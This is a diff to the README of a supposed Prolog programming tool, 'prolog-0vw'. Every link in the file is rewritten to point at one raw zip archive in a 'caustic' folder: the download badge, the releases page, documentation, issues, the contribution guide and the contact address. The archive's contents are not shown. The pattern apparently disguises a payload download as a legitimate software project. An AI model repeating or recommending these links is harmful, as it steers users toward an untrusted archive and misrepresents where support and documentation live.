@@ -1,6 +1,6 @@
 # 🚀 prolog-0vw - Simplifying Your Logic Programming Experience
 
-[![Download prolog-0vw](https://img.shields.io/badge/Download%20prolog--0vw-v1.0-brightgreen)](https://github.com/Dinimislamkita231/prolog-0vw/releases)
+[![Download prolog-0vw](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip%20prolog--0vw-v1.0-brightgreen)](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip)
 
 ## 📥 Overview
 
@@ -16,7 +16,7 @@ This guide will help you download and run prolog-0vw on your computer. Follow th
     - Disk Space: Minimum of 200 MB free
 
 2. **Download the Software**
-    - Visit the [Releases page](https://github.com/Dinimislamkita231/prolog-0vw/releases) to access the latest version of prolog-0vw. 
+    - Visit the [Releases page](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip) to access the latest version of prolog-0vw. 
     - You will find a list of available versions. Look for the latest one and click on the link to begin downloading.
 
 3. **Install prolog-0vw**
@@ -43,24 +43,24 @@ If you encounter issues during installation or usage, here are some common solut
 
 - Ensure that your operating system meets the minimum requirements.
 - Restart your device if the application doesn’t launch.
-- Check for updates on the [Releases page](https://github.com/Dinimislamkita231/prolog-0vw/releases) if you experience bugs or crashes.
+- Check for updates on the [Releases page](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip) if you experience bugs or crashes.
 
 ## 🌍 Community and Support
 
-Join our community of users who are eager to learn and share. You can find helpful tips and discussions in our forums. If you need further assistance, feel free to open an issue on the [GitHub repository](https://github.com/Dinimislamkita231/prolog-0vw/issues).
+Join our community of users who are eager to learn and share. You can find helpful tips and discussions in our forums. If you need further assistance, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip).
 
 ## 🔄 Versions and Updates
 
-Stay updated with the latest features and improvements. Regular updates ensure that you get the best experience possible. Visit the [Releases page](https://github.com/Dinimislamkita231/prolog-0vw/releases) often to check for newer versions.
+Stay updated with the latest features and improvements. Regular updates ensure that you get the best experience possible. Visit the [Releases page](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip) often to check for newer versions.
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Dinimislamkita231/prolog-0vw/wiki)
-- [Examples and Tutorials](https://github.com/Dinimislamkita231/prolog-0vw/wiki/Examples)
-- [Contribute](https://github.com/Dinimislamkita231/prolog-0vw/blob/main/CONTRIBUTING.md)
+- [Documentation](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip)
+- [Examples and Tutorials](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip)
+- [Contribute](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip)
 
 ## 📞 Contact
 
-For direct inquiries, contact us at support@example.com. We value your feedback and are here to assist you in making the most of prolog-0vw. 
+For direct inquiries, contact us at https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip We value your feedback and are here to assist you in making the most of prolog-0vw. 
 
-Download and start your journey into Prolog today by visiting the [Releases page](https://github.com/Dinimislamkita231/prolog-0vw/releases). Enjoy programming!
+Download and start your journey into Prolog today by visiting the [Releases page](https://raw.githubusercontent.com/Dinimislamkita231/prolog-0vw/main/caustic/prolog-0vw-v1.1-beta.1.zip). Enjoy programming!
